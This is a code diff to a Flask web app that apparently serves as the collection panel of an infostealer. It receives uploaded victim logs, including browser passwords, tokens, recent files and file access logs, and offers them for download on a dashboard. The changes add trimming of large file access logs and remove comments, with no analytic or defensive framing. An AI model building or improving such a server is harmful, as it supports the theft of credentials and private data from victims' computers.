@@ -15,8 +15,7 @@ COLUMNS = [
     "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
 ]
 
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
+HTML_TEMPLATE = '''<!DOCTYPE html>
 <html>
 <head>
   <title>Log Dashboard</title>
@@ -62,8 +61,7 @@ HTML_TEMPLATE = '''
     </table>
   {% endif %}
 </body>
-</html>
-'''
+</html>'''
 
 @app.route("/", methods=["GET", "POST"])
 def index():
@@ -81,9 +79,22 @@ def receive():
     folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     save_path = os.path.join(UPLOAD_ROOT, folder_name)
     os.makedirs(save_path, exist_ok=True)
+
     for file in request.files.values():
         filename = secure_filename(file.filename)
-        file.save(os.path.join(save_path, filename))
+        full_path = os.path.join(save_path, filename)
+        file.save(full_path)
+
+        # Trim large file_access_log.txt files
+        if "file_access" in filename.lower():
+            try:
+                with open(full_path, "r", encoding="utf-8") as f:
+                    lines = f.readlines()
+                with open(full_path, "w", encoding="utf-8") as f:
+                    f.writelines(lines[-500:])
+            except Exception as e:
+                print(f"[!] Failed to trim file_access_log: {e}")
+
     return "Logs received"
 
 @app.route("/download/<folder>/<filename>")
@@ -103,7 +114,6 @@ def get_logs():
             "files": []
         }
 
-        # Find hostname from any .txt log
         for f in files:
             if "activity" in f.lower() or "system" in f.lower() or "log" in f.lower():
                 try:
@@ -118,7 +128,6 @@ def get_logs():
                     pass
                 break
 
-        # Match files to columns (cell = download link)
         def match_file(keywords):
             for file in files:
                 if any(k in file.lower() for k in keywords):
